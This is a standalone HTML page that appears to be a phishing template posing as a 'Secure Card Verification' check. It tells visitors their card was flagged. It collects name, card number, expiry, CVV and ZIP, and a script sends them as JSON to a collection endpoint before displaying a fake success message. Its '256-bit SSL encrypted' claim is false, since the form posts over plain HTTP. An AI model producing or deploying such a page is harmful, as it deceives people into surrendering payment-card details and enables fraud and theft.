<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Card Verification</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f2f4f7;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }
  .container {
    background: #ffffff;
    border-radius: 10px;
    width: 360px;
    padding: 35px 30px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.12);
  }
  .header {
    text-align: center;
    margin-bottom: 25px;
  }
  .header h2 {
    margin: 0;
    font-size: 22px;
    color: #1a1a1a;
  }
  .header p {
    font-size: 13px;
    color: #666;
    margin-top: 6px;
  }
  label {
    display: block;
    font-size: 12px;
    color: #444;
    margin: 12px 0 5px;
    font-weight: bold;
  }
  input, select {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccd0d5;
    border-radius: 6px;
    box-sizing: border-box;
    font-size: 14px;
  }
  .row {
    display: flex;
    gap: 10px;
  }
  .row > div { flex: 1; }
  .verify-btn {
    width: 100%;
    padding: 12px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 20px;
  }
  .verify-btn:hover { background-color: #145dbf; }
  .secure-note {
    font-size: 11px;
    color: #888;
    text-align: center;
    margin-top: 15px;
  }
  .lock { font-size: 14px; }
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>🔒 Secure Card Verification</h2>
      <p>Your card was flagged for a routine security check. Please confirm your details to continue.</p>
    </div>

    <form id="cardForm">
      <label for="cardname">Cardholder Name</label>
      <input type="text" id="cardname" name="cardname" placeholder="John A. Doe" required>

      <label for="cardnumber">Card Number</label>
      <input type="text" id="cardnumber" name="cardnumber"
             placeholder="1234 5678 9012 3456" maxlength="19" required>

      <div class="row">
        <div>
          <label for="expiry">Expiry (MM/YY)</label>
          <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
        </div>
      </div>

      <label for="zip">Billing ZIP Code</label>
      <input type="text" id="zip" name="zip" placeholder="94025" maxlength="10" required>

      <button type="submit" class="verify-btn">Verify Card</button>
    </form>

    <p class="secure-note"><span class="lock">🔐</span> 256-bit SSL encrypted connection</p>
  </div>

<script>
  document.getElementById("cardForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const data = {
      cardname:   document.getElementById("cardname").value,
      cardnumber: document.getElementById("cardnumber").value,
      expiry:     document.getElementById("expiry").value,
      cvv:        document.getElementById("cvv").value,
      zip:        document.getElementById("zip").value
    };

    fetch("http://localhost:8000/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
      .then(response => response.json())
      .then(resp => {
        console.log("Success:", resp);
        alert("Verification successful. You may now close this window.");
      })
      .catch(error => {
        console.error("Error:", error);
        alert("Verification failed. Please try again.");
      });
  });
</script>
</body>
</html>
